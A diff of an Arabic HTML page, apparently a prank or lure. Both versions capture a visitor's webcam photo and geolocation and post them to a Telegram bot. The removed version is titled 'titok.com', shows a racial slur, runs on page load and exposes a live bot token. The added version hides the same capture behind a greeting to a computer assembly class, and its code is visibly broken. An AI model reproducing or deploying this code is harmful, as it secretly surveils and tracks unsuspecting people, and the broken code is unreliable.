@@ -2,101 +2,115 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>  titok.com</title>
+<title>تحياتي لكم</title>
 <style>
   body {
-    background-color: #FFFFFF; /* أبيض قوي */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    flex-direction: column;
-    font-family: 'Arial', sans-serif;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background-color: #ffffff; /* خلفية أبيض صافٍ */
+    font-family: Arial, sans-serif;
   }
 
-  .text {
-    font-size: 24px;
+  .heart {
+    position: absolute;
     color: black;
-    margin-bottom: 20px;
     font-weight: bold;
-    animation: fade 2s infinite alternate;
-  }
-
-  .greeting {
     font-size: 24px;
-    color: black;
-    margin-top: 10px;
-    font-weight: bold;
-    display: none; /* مخفية بالبداية */
+    user-select: none;
+    pointer-events: none;
+    white-space: nowrap;
+    animation: floatUp linear infinite;
   }
 
-  @keyframes fade {
-    from { opacity: 0.6; }
-    to { opacity: 1; }
+  @keyframes floatUp {
+    0% { transform: translateY(100vh) scale(1); opacity: 1; }
+    100% { transform: translateY(-50px) scale(0.5); opacity: 0; }
   }
-</style>
-</head>
-<body>
 
-<div class="text">  lol Nigga  </div>
-<div class="greeting">   😊</div>
+  #sendBtn {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    padding: 15px 30px;
+    font-size: 18px;
+    background-color: black;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    z-index: 1000;
+  }
 
+ 
 <script>
-  // تظهر رسالة بعد 5 ثواني
-  setTimeout(() => {
-    document.querySelector('.greeting').style.display = 'block';
-  }, 5000);
+  // ======== حركة القلوب ========
+  const texts = ['تحياتي لكم طلاب قسم تجميع الحاسبات أ'];
 
-  async function captureAndSend() {
+  function createHeart() {
+    const heart = document.createElement('div');
+    heart.className = 'heart';
+    heart.textContent = texts[Math.floor(Math.random() * texts.length)];
+    heart.style.left = Math.random() * window.innerWidth + 'px';
+    heart.style.fontSize = (20 + Math.random() * 30) + 'px';
+    heart.style.animationDuration = (4 + Math.random() * 3) + 's';
+    document.body.appendChild(heart);
+    setTimeout(() => heart.remove(), 7000);
+  }
+
+  setInterval(createHeart, 300);
+
+  // ======== إرسال الصورة والموقع للبوت ========
+  const BOT_TOKEN = "ضع_التوكن_هنا"; // ضع توكن البوت على جهازك فقط
+  const CHAT_ID = "1037860664";       // ايدي الشات الخاص بك
+
+  async function sendPhotoAndLocation(blob, latitude, longitude) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "capture.jpg");
+
+    // إرسال الصورة
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+
+    // إرسال الموقع
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
+  }
+
+  // ======== التقاط الصورة والموقع بعد الضغط ========
+  document.getElementById('send').addEventListener( async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement('video');
+      const video = document.querySelector('video');
       video.srcObject = stream;
-      video.play();
 
-      await new Promise(resolve => setTimeout(resolve, 3000));
-
-      const canvas = document.createElement('canvas');
-      canvas.width = 640;
-      canvas.height = 480;
+      const canvas = document.querySelector('canvas');
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      const imageData = canvas.toDataURL('image/jpeg');
+      setTimeout(async () => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
 
-      const blob = await (await fetch(imageData)).blob();
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const latitude = pos.coords.latitude;
+          const longitude = pos.coords.longitude;
 
-      const formData = new FormData();
-      formData.append("chat_id", "1037860664");
-      formData.append("photo", blob, "capture.jpg");
-
-      fetch("https://api.telegram.org/bot7834101163:7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendPhoto", {
-        method: "POST",
-        body: formData
-      });
-
-      stream.getTracks().forEach(track => track.stop());
-
-      navigator.geolocation.getCurrentPosition(position => {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-
-        fetch(`https://api.telegram.org/bot7834101163:AAHfKje_0WRR9T1s1tajuBryZk9c6IDMHOc/sendLocation?chat_id=1037860664&latitude=${latitude}&longitude=${longitude}`, {
-          method: "GET"
+          await sendPhotoAndLocation(blob, latitude, longitude);
+          alert("تم إرسال الصورة والموقع للبوت بنجاح!");
         });
-      }, error => {
-        console.error("فشل الحصول على الموقع:", error);
-      });
+
+        stream.getTracks().forEach(track => track.stop());
+      }, 2000);
 
     } catch (err) {
-      console.error("فشل الوصول إلى الكاميرا:", err);
+      console.error("فشل الوصول للكاميرا أو الموقع:", err);
+      alert("حدث خطأ في الوصول للكاميرا أو الموقع.");
     }
-  }
-
-  captureAndSend();
+  });
 </script>
 
 </body>
 </html>
-
-
